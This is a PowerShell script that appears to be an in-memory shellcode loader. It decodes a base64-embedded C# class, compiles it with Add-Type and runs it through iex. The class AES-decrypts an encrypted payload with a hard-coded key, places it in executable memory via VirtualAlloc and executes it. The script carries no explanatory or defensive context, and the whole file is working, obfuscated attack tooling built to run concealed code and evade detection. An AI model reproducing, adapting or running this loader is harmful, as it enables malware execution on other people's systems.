$id = Get-Random
$Source1 = Get-Content "shellcs.cs"
$Assem = (
    "Microsoft.SharePoint, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" ,
    "Microsoft.SharePoint.Publishing, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"
    )

$b = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KDQpwdWJsaWMgY2xhc3MgUHJvZ3JhbQ0Kew0KCXByaXZhdGUgZGVsZWdhdGUgaW50IFRQYXlQcm9jKCk7DQoNCglwcml2YXRlIGNvbnN0IHVpbnQgTUVNX0NPTU1JVCA9IDQwOTZ1Ow0KDQoJcHJpdmF0ZSBjb25zdCB1aW50IE1FTV9SRVNFUlZFID0gODE5MnU7DQoNCglwcml2YXRlIGNvbnN0IHVpbnQgUEFHRV9FWEVDVVRFX1JFQURXUklURSA9IDY0dTsNCg0KCXByaXZhdGUgY29uc3QgdWludCBNRU1fUkVMRUFTRSA9IDMyNzY4dTsNCg0KCVtEbGxJbXBvcnQoIktlcm5lbDMyLmRsbCIpXQ0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGFkZHJlc3MsIGludCBzaXplLCB1aW50IGFsbG9jVHlwZSwgdWludCBwcm90ZWN0KTsNCg0KCVtEbGxJbXBvcnQoIktlcm5lbDMyLmRsbCIpXQ0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbEZyZWUoSW50UHRyIGFkZHJlc3MsIGludCBzaXplLCB1aW50IGZyZWVUeXBlKTsNCg0KCXB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpDQoJew0KCQlieXRlW10gYXJyYXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoIjRxUHhmODdqdU9XSEp2bm4rdlNlc1hqUENiSnBKWlRJSmwvelpSTFdhRTEyanFRQkppWjZSeXduaXJsT3lzR3BwTzFHdEM4Zmx2a0pVZzVWaGFGbHFrMnhQbXJ1TUhHalFYNXJ2aUl1UEF4cXlSM25RVGxlampqc25PZGppbHpycERxU2R1bm51dVp2Qm1Kd09OQTRzMEJET0FQOGZ6YjFWb3M1cHVSb0JvVlhIVkJwODM0Zk1DeWxUdzVQbjdySC9vbEY4Ry9URjVtam9oNGhuTTFSelRtb05xUmNDUEoxWWYva0xrUkc5WVd5WVJKQ0lwUGp0Wm9oeWg0ek1qUGxxdHd6NDRHMVRoMkQrUHJIOTcrL1ZheWlpQUZuTzdYeTBrNXlXWjhHSHRpalM2WndsOG1oK0cyT3pCa244bUFEODZ3NUp0UEgxUXFneWxwQ2l2UkdKVjN5K0FVd1VROElSVGt6YytRNHBNb2xwWEIyaWR5c1R2WlN5d3QxVGIwdHh6UjFGdy9RWDJKZFo2NHFnRUQ4aG9FU1NqQlJMeEJ3N1h4SkU5eVZRVEc1eVFyaHA5SmU4VmRlcWdvSFY1U0ZGY3F2QWNhWUpweTFPVDdjVkF3TUtFaGZNbHByazZyZGExaTBwTFN2Rzc5dzQwWGdCMFFmRS9rQUFJUUd2N2Qrb053elFTZGxDSTUyUVZ2dXREZnkwUngxQ3BOVVRkcDRGVCtzcmI2MHRMZ09PWW9mZWZZQkM2WVBiejFXTGlRZUVUTzR3RXVhZmdmNEZNRHR4aXJ1eWJmTXcyc1VTZDZlZmcwWVZXK0VsSzhKRmFSZFZab3FuV29jcHlzeDU1ak9GUXJTWmNOWmhLYndPMmo0aFR4THFUR2o2MnRQb2Z4NTMzTVFCVnJpbGYzV1Z1c0hjdUxoR3JldlIzTk9vRTk3MFpQVWdXZkIxcWl2b3drVTlqZ2QzaVNJK0dzVU9wSFRXVUFLTUFTUlh1WUhhM3NSWDFOWmdYaGdHWU5rbnRQTWQ0c2c3R2dMTytseVU1MTFqdlQ2bjZKUVkyblFubDdDUHhPYzRIUHdzTGpEbUtQdWtZTEtocEZpN05RbFlOWXhFTU1rbUdoZFYrdXNIOFNhVVJGc20xcUdWc2FOTmRYSFovQjhsMnk5SW1pam0vUnhoZ1lsMDl5bWk2ejltbFNVcFkzZzZGMjlmZ1dDcWZ3dHRrSTh4MVFENWgvcUZoVXdXZi9KZjgrQXhMcnNCUnpYOWJ0aWw0ZzIvWFFKM1ZmZm14WlhXbEhieVVTRlI3QXh0YWt6OVFVRVJvMmpzOVZZVHYwQStjUDFtbUozSEc2L0Z2WXlsZDRJc3dLUXM2dk0yMUh1YnRRd1UyZ1FoRk5qSHJ5c2ozTGFvSzh5UnNXRUtPb1Z0RkpURnZ4ME1sM3pBc0UvcG5tdkhaeUNhd29vbC9wdjY0SFdzWUNyeVZXVmVySHRac1JMdFI5S2toQ1JRaWF3SjlBVG9tQnRPQktOOUNSNnZsSElCVnJ0UWIvWlBVdWxaSDc5OS9oNU9SNWhuUWRLaGYvV1pVSjQvUjJLejdwb1pOb2Zzdlk9Iik7DQoJCVN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkIHJpam5kYWVsTWFuYWdlZCA9IG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpOw0KCQlyaWpuZGFlbE1hbmFnZWQuS2V5ID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcygiYWJjZDEyMzU0NDUzNGtra2RkZjExMTEzMjQzMjVra2QiKTsNCgkJcmlqbmRhZWxNYW5hZ2VkLk1vZGUgPSBDaXBoZXJNb2RlLkVDQjsNCgkJcmlqbmRhZWxNYW5hZ2VkLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsNCgkJU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5JQ3J5cHRvVHJhbnNmb3JtIGNyeXB0b1RyYW5zZm9ybSA9IHJpam5kYWVsTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsNCgkJYnl0ZVtdIGFycmF5MiA9IGNyeXB0b1RyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGFycmF5LCAwLCBhcnJheS5MZW5ndGgpOw0KCQlJbnRQdHIgemVybyA9IEludFB0ci5aZXJvOw0KCQl6ZXJvID0gVmlydHVhbEFsbG9jKEludFB0ci5aZXJvLCBhcnJheTIuTGVuZ3RoLCAxMjI4OHUsIDY0dSk7DQoJCXRyeQ0KCQl7DQoJCQlNYXJzaGFsLkNvcHkoYXJyYXkyLCAwLCB6ZXJvLCBhcnJheTIuTGVuZ3RoKTsNCgkJCVRQYXlQcm9jIHRQYXlQcm9jID0gTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcih6ZXJvLCB0eXBlb2YoVFBheVByb2MpKSBhcyBUUGF5UHJvYzsNCgkJCXRQYXlQcm9jKCk7DQoJCX0NCgkJZmluYWxseQ0KCQl7DQoJCQlWaXJ0dWFsRnJlZSh6ZXJvLCAwLCAzMjc2OHUpOw0KCQl9DQoJfQ0KfQ0K"
#$b = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Source))
$Source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
#Write-Host $b
Add-Type -TypeDefinition $Source -Language CSharp 

iex "[Program]::Main('1')"
#[Program]::Main("e:\Tools\payload.bin")